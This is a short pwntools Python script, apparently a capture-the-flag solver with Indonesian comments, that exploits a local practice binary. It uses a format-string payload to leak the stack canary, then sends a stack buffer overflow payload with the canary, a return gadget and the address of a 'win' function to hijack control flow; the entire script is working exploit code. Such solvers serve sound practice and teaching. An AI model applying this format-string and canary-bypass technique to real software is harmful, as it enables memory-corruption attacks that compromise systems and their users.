# solver ini sudah di rapikan dan di hias tipis tipis. 
# solver by aku

from pwn import *

context.log_level = 'error'
elf = context.binary = ELF('./chall')

def leaker():
    for i in range(32):
        p = process()
        pay = f'DDDD%{i}$p'
        p.sendlineafter(b'name:',pay.encode())
        p.sendlineafter(b'Choice: ',b'1')
        p.recvuntil(b'DDDD')

        data = p.recvline().strip().replace(b'Role:   Customer',b'')
        print(i,'-',data.decode())
        p.close()

# leaker()

def main():
    p = process()
    # p = remote('127.0.0.1', 1337) # koneksi remote

    pay = f'DDDD%17$p'
    p.sendlineafter(b'name:',pay.encode())
    p.sendlineafter(b'Choice: ',b'1')
    p.recvuntil(b'DDDD')

    canary = p.recvline().strip().replace(b'Role:   Customer',b'')
    print("[+] canary: ",text.green(canary.decode()))
    canary = int(canary,16)

    pad = b'A' * 40 
    win = elf.sym.win
    print('[+] fungsi win: ',text.green(hex(win)))
    ret = 0x40101a

    pay = flat(
        pad, canary, b'a'*8, ret, win
    )

    p.sendlineafter(b'Choice: ',b'2')
    p.sendlineafter(b'PIN: ',pay)
    p.sendlineafter(b'Choice: ',b'3')

    print('\n',p.recvall().decode())
    p.close()

main()
